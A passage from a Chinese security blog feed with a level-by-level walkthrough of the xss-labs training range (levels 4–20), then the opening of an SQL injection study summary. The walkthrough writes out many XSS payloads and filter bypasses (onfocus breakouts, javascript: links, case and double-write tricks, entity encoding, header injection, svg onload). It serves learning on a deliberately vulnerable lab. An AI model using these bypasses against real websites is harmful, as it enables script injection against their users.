onfocus=javascript:alert() ‘</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022049951.png" alt="Image 20"></p><h2 id="Level4"><a href="#Level4" class="headerlink" title="Level4"></a>Level4</h2><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022049595.png" alt="Image 21"></p><p>看看前端代码</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022049852.png" alt="Image 22"></p><p>试试能不能闭合掉”&#x2F;&gt;</p><p>不好使</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022049464.png" alt="Image 23"></p><p>用focus</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-string">&quot; onfocus=javascript:alert() &quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022049625.png" alt="Image 24"></p><h2 id="Level5"><a href="#Level5" class="headerlink" title="Level5"></a>Level5</h2><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022049066.png" alt="Image 25"></p><p>试了试</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">”/&gt;<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert()<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span>&lt;”<br></code></pre></td></tr></table></figure><p>不好使，看看php，过滤了js的标签还有onfocus事件，虽然str_replace不区分大小写，但是有小写字母转化函数，所以就不能用大小写法来绕过过滤了，只能新找一个方法进行xss注入</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022049035.png" alt="Image 26"></p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022049345.png" alt="Image 27"></p><p>这里我们用<strong>a href标签法</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-string">&quot;/&gt;&lt;a href=javascript:alert()&gt;a-alert&lt;/a&gt;&lt;&quot;</span><br></code></pre></td></tr></table></figure><p>点击我们写的a-alert</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022049254.png" alt="Image 28"></p><h2 id="Level6"><a href="#Level6" class="headerlink" title="Level6"></a>Level6</h2><p>简单尝试之前的payload发现不好使</p><p>这关过滤掉了on,src,href,data，但是没有添加小写转化函数 ，导致能用大写绕过</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022049915.png" alt="Image 29"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-string">&quot;/&gt;&lt;ScRipt&gt;alert()&lt;/ScriPt&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022049524.png" alt="Image 30"></p><h2 id="Level7"><a href="#Level7" class="headerlink" title="Level7"></a>Level7</h2><p>不难发现，这里面进行了小写转化，将检测出来的on，script，href给删掉了</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022049729.png" alt="Image 31"></p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022049032.png" alt="Image 32"></p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022049223.png" alt="Image 33"></p><p>但是没有关系，我们可以利用双拼写来绕过。</p><p>比如on，我们可以写成oonn，当中间on被删掉的时候，就变成了on；比如script，可以写成scscriptipt，当script被删掉的时候，就变成了script</p><p>甚至可以在外面一层进行大小写绕过，比如下面</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-string">&quot;/&gt;&lt;SCRscriptIPT&gt;alert()&lt;/SCRscriptIPT&gt;&lt;&quot;</span><br></code></pre></td></tr></table></figure><h2 id="Level8"><a href="#Level8" class="headerlink" title="Level8"></a>Level8</h2><p>试了试老方法，不太行</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022049087.png" alt="Image 34"></p><p>可以发现，input标签添加了html实体转化函数还把双引号也给实体化了， 添加了小写转化函数，还有过滤掉了src、data、onfocus、href、script、”（双引号），难搞哦，看一下这关的源码</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022049214.png" alt="Image 35"></p><p>但是我们能利用href的隐藏属性自动Unicode解码，我们可以插入一段js伪协议</p><p>在线Unicode编码：<a href="https://www.matools.com/code-convert-unicode" title="在线Unicode编码解码 - 码工具">在线Unicode编码解码 - 码工具</a></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&amp;#<span class="hljs-number">106</span>;&amp;#<span class="hljs-number">97</span>;&amp;#<span class="hljs-number">118</span>;&amp;#<span class="hljs-number">97</span>;&amp;#<span class="hljs-number">115</span>;&amp;#<span class="hljs-number">99</span>;&amp;#<span class="hljs-number">114</span>;&amp;#<span class="hljs-number">105</span>;&amp;#<span class="hljs-number">112</span>;&amp;#<span class="hljs-number">116</span>;&amp;#<span class="hljs-number">58</span>;&amp;#<span class="hljs-number">97</span>;&amp;#<span class="hljs-number">108</span>;&amp;#<span class="hljs-number">101</span>;&amp;#<span class="hljs-number">114</span>;&amp;#<span class="hljs-number">116</span>;&amp;#<span class="hljs-number">40</span>;&amp;#<span class="hljs-number">41</span>;<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022049052.png" alt="Image 36"></p><p>复制后添加友情链接，然后点击友情链接</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022049004.png" alt="Image 37"></p><h2 id="Level9"><a href="#Level9" class="headerlink" title="Level9"></a>Level9</h2><p>试试上一关的方法</p><p>竟然没插入成功</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022049501.png" alt="Image 38"></p><p>这里呢，当false&#x3D;&#x3D;&#x3D;false的时候(就是传入的值没有http:&#x2F;&#x2F;)就会执行if</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022049267.png" alt="Image 39"></p><p>为了防止false&#x3D;&#x3D;&#x3D;false，我们需要向传入的值里面添加http:&#x2F;&#x2F;，而且要用注释符注释掉，否则会执行不了、无法弹窗，让函数strpos返回一个数字，构造payload</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&amp;#<span class="hljs-number">106</span>;&amp;#<span class="hljs-number">97</span>;&amp;#<span class="hljs-number">118</span>;&amp;#<span class="hljs-number">97</span>;&amp;#<span class="hljs-number">115</span>;&amp;#<span class="hljs-number">99</span>;&amp;#<span class="hljs-number">114</span>;&amp;#<span class="hljs-number">105</span>;&amp;#<span class="hljs-number">112</span>;&amp;#<span class="hljs-number">116</span>;&amp;#<span class="hljs-number">58</span>;&amp;#<span class="hljs-number">97</span>;&amp;#<span class="hljs-number">108</span>;&amp;#<span class="hljs-number">101</span>;&amp;#<span class="hljs-number">114</span>;&amp;#<span class="hljs-number">116</span>;&amp;#<span class="hljs-number">40</span>;&amp;#<span class="hljs-number">41</span>;<span class="hljs-comment">/* http:// */</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022049170.png" alt="Image 40"></p><h2 id="Level10"><a href="#Level10" class="headerlink" title="Level10"></a>Level10</h2><p>简单试了试之前的方法，没有效果</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022050836.png" alt="Image 41"></p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022049612.png" alt="Image 42"></p><p>看源码，原来还有其他隐藏的参数传递，下次就一个个测，这里是get传参t_sort，并过滤掉了&lt;&gt;号，不能闭合插入标签</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022049167.png" alt="Image 43"></p><p>所以我们用onfocus事件，因为这里输入框被隐藏了，需要添加type&#x3D;”text”，构造payload</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">?t_sort=<span class="hljs-string">&quot; onfocus=javascript:alert() type=&quot;</span>text<br></code></pre></td></tr></table></figure><p>（点击空边框即可下一关）</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022050976.png" alt="Image 44"></p><p>看一下前端代码，完美闭合</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022050153.png" alt="Image 45"></p><h2 id="Level11"><a href="#Level11" class="headerlink" title="Level11"></a>Level11</h2><p><code>&lt;input&gt;</code>标签有四个值，都做了隐藏处理，</p><p>不难看出，第四个名为t_ref的<code>&lt;input&gt;</code>标签是http头referer的参数</p><p>（HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器该网页是从哪个页面链接过来的，服务器因此可以获得一些信息用于处理。这里可以看到咱们刚刚是从level10.php来的）</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022050618.png" alt="Image 46"></p><p>咱们在referer上试试，用bp抓包一下，试一下测试代码</p><p>Referer:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-string">&quot; sRc DaTa OnFocus &lt;sCriPt&gt; &lt;a hReF=javascript:alert()&gt; &amp;#106;</span><br></code></pre></td></tr></table></figure><p><img src="https://i-blog.csdnimg.cn/direct/89bc463711d44654a34a32510a942ff2.png" alt="Image 47"></p><p>放包，发现过滤了&lt;&gt;</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022050029.png" alt="Image 48"></p><p>那就用上一题的payload</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-string">&quot; onfocus=javascript:alert() type=&quot;</span>text<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022050411.png" alt="Image 49"></p><p>点击空边框</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022050579.png" alt="Image 50"></p><h2 id="Level12"><a href="#Level12" class="headerlink" title="Level12"></a>Level12</h2><p>看一下前端代码，</p><p>t-ua肯定是User-Agent头了</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022050935.png" alt="Image 51"></p><p>再用burpsuite抓包一下，将User-Agent头修改为我们的测试代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-string">&quot; sRc DaTa OnFocus &lt;sCriPt&gt; &lt;a hReF=javascript:alert()&gt; &amp;#106;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022050374.png" alt="Image 52"></p><p>还是过滤&lt;&gt;</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022050983.png" alt="Image 53"></p><p>直接套用上题的payload</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-string">&quot; onfocus=javascript:alert() type=&quot;</span>text<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022050114.png" alt="Image 54"></p><h2 id="Level13"><a href="#Level13" class="headerlink" title="Level13"></a>Level13</h2><p>t_cook应该是cookie</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022050879.png" alt="Image 55"></p><p>看看cookie，确实如此</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022050007.png" alt="Image 56"></p><p>还是试试测试代码，</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-string">&quot; sRc DaTa OnFocus &lt;sCriPt&gt; &lt;a hReF=javascript:alert()&gt; &amp;#106;</span><br></code></pre></td></tr></table></figure><p>发现过滤了&lt;&gt;</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022050671.png" alt="Image 57"></p><p>直接套用上题的payload</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-string">&quot; onfocus=javascript:alert() type=&quot;</span>text<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022050474.png" alt="Image 58"></p><h2 id="Level14"><a href="#Level14" class="headerlink" title="Level14"></a>Level14</h2><p>这一关我们似乎访问不了，一直加载不出来</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022050974.png" alt="Image 59"></p><p>查看源码通过iframe标签引入了一个<a href="http://exofvoewer.org/">http://exofvoewer.org</a></p><p>这题本来是利用转跳到的网站，在那网站去上传一个属性里面含有xss代码的图片，以达到弹窗的效果。可以参考下面这篇文章：</p><p><a href="https://xz.aliyun.com/t/1206?accounttraceid=74ab404d-2a01-4a1c-8b87-36ad367dbe11&time__1311=eqGhqfxmxAxRhEDlrmq0=fd4Gq0K5tIh5dx#toc-12" title="【巨人肩膀上的矮子】XSS挑战之旅---游戏通关攻略（更新至18关） - 先知社区">【巨人肩膀上的矮子】XSS挑战之旅—游戏通关攻略（更新至18关） - 先知社区</a></p><p>这篇文章里面的wooyun也已经闭站了，大家有兴趣可以去搜搜这个wooyun（乌云网），看完感觉有些感慨。</p><p>这关主要涉及的漏洞是exif xss漏洞。exif是<strong>可交换图像文件</strong>格式（英语：Exchangeable image file format，官方简称Exif），是专门为数码相机的照片设定的，可以记录<strong>数码照片的属性信息和拍摄数据</strong>。</p><p>我们可以在网上随便下载一个带有exif的图片，然后按下面步骤制作图片xss。当然可能大家想做的图片可能没有exif，这里作者制作了一个脚本，可以给没有exif的图片加上exif</p><p>（需要下载两个Python包：</p><ol><li><strong>Pillow</strong>：这是一个用于图像处理的库，支持打开、操作和保存多种格式的图像。</li><li><strong>piexif</strong>：用于处理EXIF数据的库，能方便地读取、修改和保存EXIF信息。</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">pip install Pillow piexif<br></code></pre></td></tr></table></figure><p>）。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> piexif<br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><br><span class="hljs-comment"># 加载 JPG 图片</span><br>image_path = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;Please enter your image path:\n&quot;</span>)<br>img = Image.<span class="hljs-built_in">open</span>(image_path)<br><br><span class="hljs-comment"># 创建新的 EXIF 数据</span><br>exif_dict = &#123;<br>    piexif.ImageIFD.ImageDescription: <span class="hljs-string">&quot;新标题&quot;</span>,<br>    piexif.ImageIFD.Make: <span class="hljs-string">&quot;相机品牌&quot;</span>,<br>    piexif.ImageIFD.Model: <span class="hljs-string">&quot;相机型号&quot;</span>,<br>    piexif.ImageIFD.Software: <span class="hljs-string">&quot;编辑软件&quot;</span>,<br>    piexif.ImageIFD.Artist: <span class="hljs-string">&quot;作者名&quot;</span>,<br>    piexif.ImageIFD.Copyright: <span class="hljs-string">&quot;版权所有信息&quot;</span>,<br>    piexif.ImageIFD.DateTime: <span class="hljs-string">&quot;2024:10:01 12:00:00&quot;</span>,<br>&#125;<br><br><span class="hljs-comment"># 将字典转换为二进制 EXIF 数据</span><br>exif_bytes = piexif.dump(exif_dict)<br><br><span class="hljs-comment"># 保存带有 EXIF 数据的图片</span><br>img.save(<span class="hljs-string">&quot;output_image.jpg&quot;</span>, exif=exif_bytes)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;EXIF 信息已成功添加！&quot;</span>)<br></code></pre></td></tr></table></figure><p>我们右键图片选择属性，点击详细信息就可以看到exif的相关属性。</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022050776.jpeg" alt="Image 60"></p><p>我们可以在这些属性里面添加XSS代码，然后上传图片实现弹窗。</p><p>由于目标URL无法访问我们也无法上传图片。</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022050142.jpeg" alt="Image 61"></p><p>因为iframe是内嵌对象，所以可以通过内嵌对象中的内容，通过XSS获取到相关信息。</p><h2 id="Level15"><a href="#Level15" class="headerlink" title="Level15"></a>Level15</h2><p>可以看到这儿有个陌生的东西ng-include。</p><p>使用了ng-include这个表达式的意思是当HTML代码过于复杂时，可以将部分代码打包成独立文件，在使用ng-include来引用这个独立的HTML文件。</p><p><strong>ng-include</strong> 指令用于包含外部的 HTML 文件，包含的内容将作为指定元素的子节点，ng-include 属性的值可以是一个表达式，返回一个文件名，默认情况下，包含的文件需要包含在同一个域名下。</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022050887.png" alt="Image 62"></p><p>我们先试试看ng-include，看看包涵第一关是怎样的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">?src=<span class="hljs-string">&#x27;level1.php&#x27;</span><br></code></pre></td></tr></table></figure><p>发现两关合二为一了（如下）</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022050267.png" alt="Image 63"></p><p>先测试一下过滤了啥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">?src=<span class="hljs-string">&quot; &#x27; sRc DaTa OnFocus &lt;sCriPt&gt; &lt;a hReF=javascript:alert()&gt; &amp;#106;</span><br></code></pre></td></tr></table></figure><p>发现这里进行了实体转义，所以在本关进行xss有些困难，好在并没有删除&lt;&gt;等符号，实体转义后在别的关卡还是好使的。</p><p>所以可以随便包涵之前的一关并对其传参，以达到弹窗的效果</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022051621.png" alt="Image 64"></p><p>注意，这里不能包涵那些直接弹窗的东西如<script>，比如?src=&#39;level1.php?name=<script>alert()</script>‘，但是可以包涵那些标签的东西比如<a>、<input>、<img>、<p>标签等等，这些标签是能需要我们手动点击弹窗的，构造正确的payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">?src=<span class="hljs-string">&#x27;level1.php?name=&lt;img src=XXX onmouseover=alert()&gt;&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022051526.png" alt="Image 65"></p><h2 id="Level16"><a href="#Level16" class="headerlink" title="Level16"></a>Level16</h2><p>test插入到了center标签中，所以这里就不用闭合了，老规矩，先测试一波关键字</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022051676.png" alt="Image 66"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">?keyword=<span class="hljs-string">&quot; &#x27; sRc DaTa OnFocus OnmOuseOver OnMouseDoWn P&lt;/&gt; &lt;sCriPt&gt; &lt;a hReF=javascript:alert()&gt; &amp;#106;</span><br></code></pre></td></tr></table></figure><p>对比发现，这里先是将字母小写化了，再把script和&#x2F;替换成空格，最后将空格给实体化</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022051591.png" alt="Image 67"></p><p>空格可以用回车来代替绕过，回车的url编码是%0a，再配合上不用&#x2F;的<code>&lt;img&gt;、&lt;details&gt;、&lt;svg&gt;</code>等标签</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">?keyword=&lt;svg%0Aonload=alert()&gt;<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022051342.png" alt="Image 68"></p><h2 id="Level17"><a href="#Level17" class="headerlink" title="Level17"></a>Level17</h2><p>没发现什么有用的，传了两个参数</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022051245.png" alt="Image 69"></p><p>先测测关键字吧</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">?arg01=<span class="hljs-string">&quot; &#x27; sRc DaTa OnFocus OnmOuseOver OnMouseDoWn P &lt;sCriPt&gt; &lt;a hReF=javascript:alert()&gt;; &amp;arg02=&quot;</span> <span class="hljs-string">&#x27; sRc DaTa OnFocus OnmOuseOver OnMouseDoWn P &lt;sCriPt&gt; &lt;a hReF=javascript:alert()&gt;;</span><br></code></pre></td></tr></table></figure><p>对比发现，虽然加了该死的html转义，但是这里不需要闭合符号，传入的参数都出现在了embed标签上，打开后缀名为swf的文件（FLASH插件的文件，现在很多浏览器都不支持FLASH插件了）</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022051989.png" alt="Image 70"></p><p>我们来看看embed标签是啥</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022051979.png" alt="Image 71"></p><p>embed标签可以理解为定义了一个区域，可以放图片、视频、音频等内容，但是呢相对于他们，embed标签打开不了文件的时候就会没有显示的区域在，他们就能有块错误的区域</p><p>再看一下onfocus和onclick事件，这两事件是等价的，都是一触即发</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022051950.png" alt="Image 72"></p><p>支持的标签范围还广，也就是支持embed标签 ，这里呢我们可以尝试插入该标签</p><p>再看一下onmouse系列的事件</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022051054.png" alt="Image 73"></p><p>跟onfocus事件支持的标签一样 。</p><p>所以，这题的解法很简单，首先得用一个支持flash插件的浏览器打开本关（打开后会有个图片出来的，不支持flash插件浏览器就没有）。</p><p>Flash我们都用过的，记得那时候和小伙伴一起玩的火柴人、冰火人、疯狂小人战斗、还有最经典的拳皇等等等等，那时候浏览器无需下载flash就可以直接运行。</p><p>但是随着HTML5、WebGL 以及 WebAssembly的成熟，不断暴露出的安全问题，Flash还是走向了终结。微软宣布在2024年初停止对Adobe Flash Playe的支持，win10的下一次更新也将自动删除Flash。</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022051209.jpeg" alt="Image 74"></p><p>具体怎么在浏览器中打开flash我在firefox中尝试失败了，但在edge中尝试成功了，参考下面博客，经尝试，两种方法都可以。</p><p><a href="https://www.bilibili.com/read/cv34413161/" title="如何不安装Flash玩4399小游戏等Flash游戏、视频方法 - 哔哩哔哩">如何不安装Flash玩4399小游戏等Flash游戏、视频方法 - 哔哩哔哩</a></p><p>下面我们对比一下是否支持flash的区别，</p><p>不支持：</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022051752.png" alt="Image 75"></p><p>支持：</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022051017.png" alt="Image 76"></p><p>可以发现支持的就有个embed标签的区域在，不支持的就不加载</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">?arg01=a&amp;arg02= onmouseover=alert(<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022051958.png" alt="Image 77"></p><p>然后移动鼠标到embed标签区域</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022051073.png" alt="Image 78"></p><h2 id="Level18"><a href="#Level18" class="headerlink" title="Level18"></a>Level18</h2><p>直接构造payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">?arg02= onmouseover=alert()<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022051623.png" alt="Image 79"></p><h2 id="Level19、20"><a href="#Level19、20" class="headerlink" title="Level19、20"></a>Level19、20</h2><p>这两关关是flash xss，涉及到反编译，暂时过掉（以后有可能会更新），有兴趣的小伙伴们可以自己去深入学习。</p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a><strong>参考文献</strong></h2><p><a href="https://blog.csdn.net/l2872253606/article/details/125638898" title="xss-labs靶场实战全通关详细过程（xss靶场详解）-CSDN博客">xss-labs靶场实战全通关详细过程（xss靶场详解）-CSDN博客</a></p><p><a href="https://xz.aliyun.com/t/1206?accounttraceid=74ab404d-2a01-4a1c-8b87-36ad367dbe11&time__1311=eqGhqfxmxAxRhEDlrmq0=fd4Gq0K5tIh5dx&u_atoken=3ca1e0916ab10e74793a953c4d6a6c49&u_asig=1a0c399d17277940100928588e003d#toc-0" title="【巨人肩膀上的矮子】XSS挑战之旅---游戏通关攻略（更新至18关） - 先知社区">【巨人肩膀上的矮子】XSS挑战之旅—游戏通关攻略（更新至18关） - 先知社区</a></p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQL注入学习总结</title>
    <link href="/2025/05/04/SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/"/>
    <url>/2025/05/04/SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>本文是作者由CSDN博客迁移而来，原文地址：<a href="https://blog.csdn.net/2302_81178149/article/details/142738173?spm=1001.2014.3001.5501">https://blog.csdn.net/2302_81178149/article/details/142738173?spm=1001.2014.3001.5501</a></p></blockquote><p>我们下面进行大部分Web手接触的第一个漏洞——SQL注入的学习，SQL注入是owasp top10之一，是Web安全常见漏洞。</p><p>为探讨清楚SQL注入的诸多细节，<strong>我们特选经典的sqli-labs进行从入门到进阶的强化训练</strong>。而本文是经由sqli-labs训练总结而来，<strong>因此配合作者的sqli-labs通关全详解食用更佳（怎么可以光学习不训练呢）</strong>。</p><p>作者的通关文章：<a href="https://blog.csdn.net/2302_81178149/article/details/142738784?spm=1001.2014.3001.5501" title="sqli-labs通关全详解-CSDN博客">sqli-labs通关全详解-CSDN博客</a></p><h2 id="SQL基础知识"><a href="#SQL基础知识" class="headerlink" title="SQL基础知识"></a>SQL基础知识</h2><p>参考课程：</p><p><a href="https://www.bilibili.com/video/BV16D4y167TT/?spm_id_from=333.999.0.0" title="SQL的核心基础语法 | 快速入门MySQL_哔哩哔哩_bilibili">SQL的核心基础语法 | 快速入门MySQL_哔哩哔哩_bilibili</a>（下图取自该课）</p><h3 id="Web结构与MySQL数据库"><a href="#Web结构与MySQL数据库" class="headerlink" title="Web结构与MySQL数据库"></a>Web结构与MySQL数据库</h3><p><strong>Web结构</strong>：前端、后端、数据库（也有可能前后端不分离），而sql注入发生在与数据库交互时。</p><p><strong>MySQL层次</strong>（由大到小）：服务器、数据库、表格、表字段（列名）、用户数据</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021929639.png"></p><p>下面我们提到一个sql注入必需要学会的的一个数据库，也就是MySQL自带的系统库，里面存储了服务器内所有库的信息。</p><p><strong>MySQL系统库信息</strong>：</p><p>1、<em>information_schema 库</em>（必学，下面三个表都要搞透澈）：是信息数据库，其中保存着关于 MySQL 服务器维护的所有其他数据库的信息，比如数据库名、数据库表、表字段的数据类型与访问权限等。Web 渗透过程中用途很大。</p><p>​1）SCHEMATA 表：提供了当前 MySQL 实例中所有的数据库信息，show databases 结果取之此表</p><p>​2）TABLES 表：提供了关于数据中表的信息</p><p>​3）COLUMNS 表：提供了表中的列信息，详细描述了某张表的所有列以及每个列的信息。</p><p>2、<em>mysql 库</em>（仅了解）：MySQL 的核心数据库，主要负责存储数据库的用户、权限设置、关键字等 mysql 自己需要使用的控制和管理信息。</p><p>3、<em>performance_schema 